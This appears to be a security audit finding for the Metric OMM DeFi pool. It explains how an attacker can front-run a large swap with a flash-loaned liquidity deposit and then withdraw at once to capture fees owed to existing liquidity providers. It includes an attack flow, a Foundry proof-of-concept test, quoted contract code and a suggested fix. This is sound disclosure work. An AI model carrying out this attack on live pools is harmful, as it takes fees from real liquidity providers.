### Title
LP Fee Sniping via Same-Block Add/Remove Liquidity — (`metric-core/contracts/libraries/LiquidityLib.sol`, `metric-core/contracts/libraries/SwapMath.sol`)

### Summary

The Metric OMM pool imposes no delay between `addLiquidity` and `removeLiquidity`. LP fees from swaps accumulate directly inside each bin's `token0BalanceScaled` / `token1BalanceScaled`. Because `removeLiquidity` returns tokens proportional to the bin's current balance, an attacker can front-run a large swap with a flash-loan-funded deposit, let the swap inflate the bin balance with LP fees, then immediately withdraw — stealing a share of fees that should belong to pre-existing LPs.

---

### Finding Description

**Fee accounting in SwapMath**

Every swap function in `SwapMath` charges a total fee (`feeAmountScaled`) on the input token. A fraction `spreadFeeE6 / 1e6` of that fee is designated as the protocol/admin spread fee (`protocolFeeAmountScaled`); the remainder — the LP fee — is left inside the bin's token balance:

```solidity
// SwapMath.buyToken0InBinSpecifiedIn (line 638-641)
uint256 protocolFeeAmountScaled = (token1FeeScaled * spreadFeeE6) / 1e6;
binState.token0BalanceScaled -= out0Scaled.toUint104();
binState.token1BalanceScaled =
    uint256((binState.token1BalanceScaled) + totalIn1Scaled - protocolFeeAmountScaled).toUint104();
``` [1](#0-0) 

The same pattern holds for all four swap variants (`buyToken0InBinSpecifiedIn/Out`, `buyToken1InBinSpecifiedIn/Out`). The LP fee (`token1FeeScaled - protocolFeeAmountScaled`) is permanently added to `binState.token1BalanceScaled` (or token0 for the reverse direction).

**Withdrawal is proportional to current bin balance**

`LiquidityLib.removeLiquidity` computes the tokens owed to a withdrawing LP as:

```solidity
// LiquidityLib.sol lines 205-206
uint256 amount0Scaled = _checkedMul(binState.token0BalanceScaled, sharesToRemove) / binTotalSharesVal;
uint256 amount1Scaled = _checkedMul(binState.token1BalanceScaled, sharesToRemove) / binTotalSharesVal;
``` [2](#0-1) 

If the bin balance has grown due to LP fees since the LP deposited, the withdrawing LP receives more than they put in — at the expense of other LPs whose share of the accumulated fees is diluted.

**No delay between add and remove**

`addLiquidity` and `removeLiquidity` are independent, permissionless calls with no time-lock, block-number check, or minimum holding period:

```solidity
// MetricOmmPool.sol lines 182-212
function addLiquidity(...) external nonReentrant(PoolActions.ADD_LIQUIDITY) ...
function removeLiquidity(...) external nonReentrant(PoolActions.REMOVE_LIQUIDITY) ...
``` [3](#0-2) 

The `nonReentrant` guard only prevents re-entrancy within a single call; it does not prevent two separate transactions in the same block.

**Attack flow**

1. Attacker observes a large pending swap in the mempool targeting bin `k`.
2. Attacker front-runs with `addLiquidity` to bin `k`, depositing `A` shares. Because the bin already has `B` tokens and `S` shares, the attacker pays `ceil(B * A / S)` tokens.
3. The victim's swap executes. The bin's token balance increases by the LP fee `F = feeAmountScaled * (1 - spreadFeeE6/1e6)`.
4. Attacker back-runs with `removeLiquidity`, withdrawing all `A` shares. They receive `(B + ceil(B*A/S) + F) * A / (S + A)` tokens.
5. Attacker profit ≈ `F * A / (S + A)` — a direct theft of LP fees from pre-existing LPs.

The `MINIMAL_MINTABLE_LIQUIDITY` guard only prevents dust positions; it does not block this attack since the attacker deposits and withdraws a large amount. [4](#0-3) 

---

### Impact Explanation

Existing LPs lose a portion of the LP fees they are owed. The stolen fraction equals `A / (S + A)` where `A` is the attacker's flash-loan deposit and `S` is the pre-existing bin liquidity. With sufficient flash-loan capital, the attacker can capture the majority of fees from any single swap. This is a direct loss of owed LP assets — the bin's token balance after the attack is lower per pre-existing share than it would have been without the attack.

---

### Likelihood Explanation

The attack requires mempool visibility (standard on most EVM chains) and flash-loan capital (freely available via Aave, Balancer, etc.). The attacker must identify which bins a pending swap will traverse, which is deterministic given the oracle price and swap parameters. The attack is economically rational whenever the captured LP fee exceeds gas costs, which is achievable for large swaps. Likelihood is **Low** due to the sophistication required, but the attack is fully permissionless and requires no privileged access.

---

### Recommendation

Enforce a minimum holding period between `addLiquidity` and `removeLiquidity` for the same position. One approach is to record the block number at which each `(owner, salt, binIdx)` position last increased its shares, and revert `removeLiquidity` if the current block number equals the deposit block number. Alternatively, implement a time-weighted share mechanism that discounts newly added shares for fee accrual purposes.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {MetricOmmPoolBaseTest} from "./MetricOmmPool.base.t.sol";
import {LiquidityDelta} from "../contracts/types/PoolOperation.sol";

contract LpFeeSnipingTest is MetricOmmPoolBaseTest {
    function test_lpFeeSnipingAttack() public {
        // Setup: legitimate LP (user 1) adds liquidity to bins -5..4
        uint256 lpIndex = 1;
        uint256 attackerIndex = 2;
        uint256 swapperIndex = 0;

        _addLiquidity(lpIndex, -5, 4, 100_000, 0);

        // Record legitimate LP's token balances before attack
        address lpCaller = _getCallerAddress(lpIndex);
        uint256 lp_token1_before = token1.balanceOf(lpCaller);

        // Attacker front-runs: adds large liquidity to the bin the swap will hit
        // Swap will be !zeroForOne (token1 in, token0 out) hitting positive bins
        int8 targetBin = 4;
        _addLiquidity(attackerIndex, targetBin, targetBin, 1_000_000, 1); // large deposit

        address attackerCaller = _getCallerAddress(attackerIndex);
        uint256 attacker_token1_before = token1.balanceOf(attackerCaller);

        // Victim swap executes: generates LP fees that stay in bin 4
        _swap(swapperIndex, users[swapperIndex], false, int128(50_000), type(uint128).max);

        // Attacker back-runs: removes all liquidity from bin 4
        LiquidityDelta memory removeDeltas = _createDeltaArray(targetBin, 1_000_000);
        vm.prank(users[attackerIndex]);
        callers[attackerIndex].removeLiquidity(address(pool), 1, removeDeltas);

        uint256 attacker_token1_after = token1.balanceOf(attackerCaller);

        // Attacker receives more token1 than they deposited (LP fee captured)
        // Legitimate LP receives less fee than they would have without the attack
        assertGt(attacker_token1_after, attacker_token1_before,
            "Attacker profited from LP fee sniping");
    }
}
```

The attacker's `removeLiquidity` returns `binState.token1BalanceScaled * attackerShares / totalShares`, where `binState.token1BalanceScaled` has been inflated by the LP fee from the victim's swap. The legitimate LP's proportional claim on accumulated fees is permanently diluted. [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** metric-core/contracts/libraries/SwapMath.sol (L636-650)
```text
      uint256 token1FeeScaled = lpFeeScaledFromGrossInput(totalIn1Scaled, currBinBuyFeeX64, onePlusBuyFeeX64);

      uint256 protocolFeeAmountScaled = (token1FeeScaled * spreadFeeE6) / 1e6;
      binState.token0BalanceScaled -= out0Scaled.toUint104();
      binState.token1BalanceScaled =
        uint256((binState.token1BalanceScaled) + totalIn1Scaled - protocolFeeAmountScaled).toUint104();

      state.amountSpecifiedRemainingScaled -= totalIn1Scaled;
      state.amountCalculatedScaled += out0Scaled;
      state.protocolFeeAmountScaled += protocolFeeAmountScaled;

      delta0Scaled = -out0Scaled.toInt256();
      delta1Scaled = (totalIn1Scaled - protocolFeeAmountScaled).toInt256();
      binLpFeeAmount = token1FeeScaled - protocolFeeAmountScaled;
      return (targetPos, out0Scaled, delta0Scaled, delta1Scaled, binLpFeeAmount);
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L76-79)
```text
          uint256 newUserShares = userShares + sharesToAdd;
          if (newUserShares < ctx.minimalMintableLiquidity) {
            revert IMetricOmmPoolActions.MinimalLiquidity(newUserShares, ctx.minimalMintableLiquidity);
          }
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L161-251)
```text
  function removeLiquidity(
    PoolContext memory ctx,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    BinTotals storage binTotals,
    mapping(int256 => BinState) storage binStates,
    mapping(int256 => uint256) storage binTotalShares,
    mapping(bytes32 => uint256) storage positionBinShares
  ) public returns (uint256 amount0Removed, uint256 amount1Removed) {
    unchecked {
      uint256 length = deltas.binIdxs.length;
      if (length == 0) return (0, 0);

      uint256 totalToken0ToRemoveScaled = 0;
      uint256 totalToken1ToRemoveScaled = 0;

      BinBalanceDelta[] memory binBalanceDeltas = new BinBalanceDelta[](length);

      for (uint256 i = 0; i < length; i++) {
        int256 binIdx = deltas.binIdxs[i];
        uint256 sharesToRemove = deltas.shares[i];

        if (binIdx < ctx.lowestBin || binIdx > ctx.highestBin) {
          revert IMetricOmmPoolActions.InvalidBinIndex(binIdx);
        }
        if (sharesToRemove == 0) continue;

        {
          // safe because -128 <= LOWEST_BIN <= HIGHEST_BIN <= 127 (enforced by factory)
          // forge-lint: disable-next-line(unsafe-typecast)
          bytes32 posKey = _positionBinKey(owner, salt, int8(binIdx));
          uint256 binTotalSharesVal = binTotalShares[binIdx];
          uint256 userShares = positionBinShares[posKey];

          if (userShares < sharesToRemove) {
            revert IMetricOmmPoolActions.InsufficientLiquidity(sharesToRemove, userShares);
          }
          uint256 newUserShares = userShares - sharesToRemove;
          if (newUserShares > 0 && newUserShares < ctx.minimalMintableLiquidity) {
            revert IMetricOmmPoolActions.MinimalLiquidity(newUserShares, ctx.minimalMintableLiquidity);
          }

          BinState storage binState = binStates[binIdx];
          uint256 amount0Scaled = _checkedMul(binState.token0BalanceScaled, sharesToRemove) / binTotalSharesVal;
          uint256 amount1Scaled = _checkedMul(binState.token1BalanceScaled, sharesToRemove) / binTotalSharesVal;

          // casting to uint104 is safe because amount0Scaled and amount1Scaled are less than token(0|1)BalanceScaled
          // forge-lint: disable-next-line(unsafe-typecast)
          binState.token0BalanceScaled -= uint104(amount0Scaled);
          // forge-lint: disable-next-line(unsafe-typecast)
          binState.token1BalanceScaled -= uint104(amount1Scaled);
          binTotalShares[binIdx] = binTotalSharesVal - sharesToRemove;
          positionBinShares[posKey] = newUserShares;

          totalToken0ToRemoveScaled += amount0Scaled;
          totalToken1ToRemoveScaled += amount1Scaled;

          binBalanceDeltas[i] = BinBalanceDelta({
            // safe because amount0Scaled is bounded by uint104 bin balances.
            // forge-lint: disable-next-line(unsafe-typecast)
            delta0Scaled: -int256(amount0Scaled),
            // safe because amount1Scaled is bounded by uint104 bin balances.
            // forge-lint: disable-next-line(unsafe-typecast)
            delta1Scaled: -int256(amount1Scaled)
          });
        }
      }

      if (totalToken0ToRemoveScaled > 0) {
        // forge-lint: disable-next-line(unsafe-typecast)
        binTotals.scaledToken0 = uint128(uint256(binTotals.scaledToken0) - totalToken0ToRemoveScaled);
      }
      if (totalToken1ToRemoveScaled > 0) {
        // forge-lint: disable-next-line(unsafe-typecast)
        binTotals.scaledToken1 = uint128(uint256(binTotals.scaledToken1) - totalToken1ToRemoveScaled);
      }

      (amount0Removed, amount1Removed) =
        _deltasScaledToExternal(totalToken0ToRemoveScaled, totalToken1ToRemoveScaled, ctx, Math.Rounding.Floor);

      if (amount0Removed > 0) {
        IERC20(ctx.token0).safeTransfer(owner, amount0Removed);
      }
      if (amount1Removed > 0) {
        IERC20(ctx.token1).safeTransfer(owner, amount1Removed);
      }

      emit IMetricOmmPoolActions.LiquidityRemoved(owner, salt, deltas.binIdxs, binBalanceDeltas, deltas.shares);
    }
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L182-212)
```text
  function addLiquidity(
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
  ) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (uint256 amount0Added, uint256 amount1Added) {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
  }

  /// @inheritdoc IMetricOmmPoolActions
  function removeLiquidity(address owner, uint80 salt, LiquidityDelta calldata deltas, bytes calldata extensionData)
    external
    nonReentrant(PoolActions.REMOVE_LIQUIDITY)
    returns (uint256 amount0Removed, uint256 amount1Removed)
  {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    if (msg.sender != owner) revert NotPositionOwner();
    _beforeRemoveLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Removed, amount1Removed) = LiquidityLib.removeLiquidity(
      _liquidityContext(), owner, salt, deltas, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterRemoveLiquidity(msg.sender, owner, salt, deltas, amount0Removed, amount1Removed, extensionData);
  }
```
